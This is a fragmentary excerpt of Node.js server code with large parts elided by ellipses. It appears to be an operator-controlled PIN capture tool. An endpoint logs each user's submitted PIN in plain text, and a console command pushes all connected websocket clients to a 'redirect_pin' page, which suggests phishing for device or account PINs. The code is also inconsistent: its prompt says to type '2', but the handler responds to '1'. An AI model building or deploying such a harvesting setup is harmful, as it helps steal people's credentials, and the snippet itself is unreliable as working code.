...
app.post('/api/pin', (req, res) => {
  console.log(`\n🔑 User submitted PIN: ${req.body.pin}\n`);
...
launcher.startNativeBrowser(
  ...
  false, // isDesktop is false for pre-boot mobile default
  () => {
...
console.log('Type "2" and press Enter to redirect clients to the PIN page.');
console.log('----------------\n');
...
rl.on('line', (input) => {
  if (input.trim() === '1') {
    ...
    console.log('Redirecting clients to the PIN page.');
    for (const ws of sessionManager.clients.keys()) {
      if (ws.readyState === 1) { // 1 = OPEN
        ws.send(JSON.stringify({ type: 'redirect_pin' }));
      }
    }
  }
});
